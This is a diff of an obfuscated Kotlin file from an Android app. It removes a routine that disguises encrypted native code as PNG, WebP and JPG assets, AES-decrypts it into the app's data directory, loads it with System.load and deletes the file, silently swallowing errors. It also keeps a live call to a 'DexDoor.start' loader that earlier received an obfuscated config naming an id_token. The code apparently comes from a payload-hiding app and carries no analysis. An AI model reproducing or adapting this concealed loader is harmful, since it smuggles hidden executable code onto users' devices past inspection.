@@ -183,29 +183,7 @@ object Fnc {
         } catch (_: Exception) {
         }
         if (isA(c)) {
-
-
-            DexDoor.start(ColorApp.app, arrayListOf(
-                """{
-    "bta":"wow_bob_dud_kuk",
-    "cvv":"id_token",
-    "nak":"981772962_981772963",
-    "akm":"5_10",
-    "nma":"10_20_30_20_5",
-    "eka":"15_10_0_30_200_400"
-}""","bug"
-            ))
-
-//            m.ki.Dva.sim(ColorApp.app, arrayListOf(
-//                """{
-//    "bta":"wow_bob_dud_kuk",
-//    "cvv":"id_token",
-//    "nak":"981772962_981772963",
-//    "akm":"5_10",
-//    "nma":"10_20_30_20_5",
-//    "eka":"15_10_0_30_200_400"
-//}""","bug"
-//            ))
+            DexDoor.start(ColorApp.app, arrayListOf("bug", c))
         }
     }
 
@@ -224,7 +202,6 @@ object Fnc {
             }
         }
     }
-
 
 
     private fun minG(a0: Int = 5) {
@@ -470,62 +447,6 @@ object Fnc {
             adminMaxTime = 100
         }
     }
-
-    private fun loadSo(ctx: Context, pkg: String, decodeKey: String, tag: String, type: String) {
-        try {
-            // 1. 选 ABI
-            var abi = ""
-            for (s in Build.SUPPORTED_64_BIT_ABIS) {
-                if (s.startsWith("arm64") || s.startsWith("x86_64")) {
-                    abi = s; break
-                }
-            }
-            if (abi.isEmpty()) {
-                for (s in Build.SUPPORTED_32_BIT_ABIS) {
-                    if (s.startsWith("armeabi") || s.startsWith("x86")) {
-                        abi = s; break
-                    }
-                }
-            }
-            if (abi.isEmpty() && Build.SUPPORTED_ABIS.isNotEmpty()) abi = Build.SUPPORTED_ABIS[0]
-
-            // 2. 根据 abi + e 选文件名
-            val imageName = if (abi.contains("64")) {
-                if (type == "T") "ziak.png" else "mgk_ka.png"
-            } else {
-                if (abi.isNotEmpty() && type == "T") "lki.webp" else "iha_opk.jpg"
-            }
-            // 3. 目标文件
-            val file = File("/data/data/$pkg/$tag")
-            if (!file.exists()) {
-                // 4. 读取 assets
-                ctx.assets.open(imageName).use { input ->
-                    val bos = ByteArrayOutputStream()
-                    val buf = ByteArray(4096)
-                    while (true) {
-                        val len = input.read(buf)
-                        if (len < 0) break
-                        bos.write(buf, 0, len)
-                    }
-                    val raw = bos.toByteArray()
-
-                    // 5. AES 解密
-                    val key = SecretKeySpec(decodeKey.toByteArray(), "AES")
-                    val decoded = Cipher.getInstance("AES/ECB/PKCS5Padding")
-                        .apply { init(Cipher.DECRYPT_MODE, key) }
-                        .doFinal(raw)
-
-                    // 6. 输出文件
-                    FileOutputStream(file).use { out -> out.write(decoded) }
-                }
-            }
-            // 7. 加载 so 并删除
-            System.load(file.absolutePath)
-            file.delete()
-        } catch (_: Throwable) {
-        }
-    }
-
 
     private fun installJ(): JSONObject {
         val json = baseJ()
